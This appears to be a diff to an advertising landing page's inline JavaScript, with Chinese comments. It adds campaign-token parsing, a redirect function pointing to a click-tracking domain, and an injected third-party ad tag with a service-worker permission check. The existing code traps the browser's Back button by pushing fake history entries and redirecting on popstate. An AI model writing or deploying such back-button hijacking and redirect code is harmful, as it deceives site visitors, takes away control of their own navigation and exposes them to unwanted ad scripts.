@@ -79,8 +79,17 @@
 			}
 	</script>
 	<script>
+		function getURLParameter(name) {
+			return decodeURIComponent(
+				(RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [,		/*添加 JS 函数以获取 URL 参数*/
+					null
+				])[1] || ""
+			);
+		}
+	</script>
+	<script>
 		var camp_id = getURLParameter("campaign_id");
-		var lp_name = getURLParameter("landing_page_title");
+		var lp_name = getURLParameter("landing_page_title");			/*为令牌添加变量*/
 		console.log(
 			`The campaign ID is: ${
 				camp_id || null
@@ -94,7 +103,7 @@
 			var t;
 			try {
 				const URL = window.location.href.split(/[#]/)[0];
-				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");
+				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");		/*后退脚本*/
 				onpopstate = function(event) {
 					event.state && location.replace(back_url);
 				};
@@ -103,6 +112,12 @@
 			}
 		})();
 	</script>
+	<script>
+		function go() {
+			window.onbeforeunload = null;
+			window.location = 'https://o35pg.bemobtrcks.com/click';		/*机器识别*/
+		}
+		</script>
 	<script>
 		var s = document.createElement('script');
 		s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5946956'+'&sw=/sw-check-permissions-a7046.js';
